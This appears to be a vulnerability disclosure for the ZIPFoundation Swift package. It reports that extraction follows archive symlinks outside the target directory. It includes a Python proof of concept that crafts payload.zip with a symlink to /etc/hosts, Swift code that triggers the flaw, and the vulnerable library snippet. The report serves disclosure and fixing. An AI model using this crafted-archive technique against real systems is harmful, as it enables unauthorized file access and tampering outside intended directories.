| Summary The package does not check if symlinks are pointing to paths outside the extraction directory Steps to Reproduce 1- Generate `payload.zip` using the following code:  ``` import zipfile  def compress_file(filename):     zipInfo = zipfile.ZipInfo(".")     zipInfo.create_system = 3     zipInfo.external_attr = 2716663808     zipInfo.filename = filename          with zipfile.ZipFile('payload.zip', 'w') as zipf:         zipf.writestr(zipInfo, "/etc/hosts")  filename = 'evil_symlink'  compress_file(filename) ```  2- Extract `payload.zip` using `unzipItem`  ``` import Foundation import ZIPFoundation  let fileManager = FileManager() var sourceURL = URL(fileURLWithPath: "/path/to/payload.zip") var destinationURL = URL(fileURLWithPath: "/path/to/")  do {     try fileManager.createDirectory(at: destinationURL, withIntermediateDirectories: true, attributes: nil)     try fileManager.unzipItem(at: sourceURL, to: destinationURL) } catch {     print("Extraction of ZIP archive failed with error:\(error)") } ``` Expected Results `evil_symlink` is not linked back after extraction Actual Results `evil_symlink` is linked back after extraction Technical details Upon extraction, the package passes the path coming from the zip entry directly to `fileManager.createSymbolicLink` without checking that it is located within extraction directory  ``` case .symlink:     guard !fileManager.itemExists(at: url) else {         throw CocoaError(.fileWriteFileExists, userInfo: [NSFilePathErrorKey: url.path])     }     let consumer = { (data: Data) in         guard let linkPath = String(data: data, encoding: .utf8) else { throw ArchiveError.invalidEntryPath }         try fileManager.createParentDirectoryStructure(for: url)         try fileManager.createSymbolicLink(atPath: url.path, withDestinationPath: linkPath)     }     checksum = try self.extract(entry, bufferSize: bufferSize, skipCRC32: skipCRC32,                                 progress: progress, consumer: consumer) } ``` |
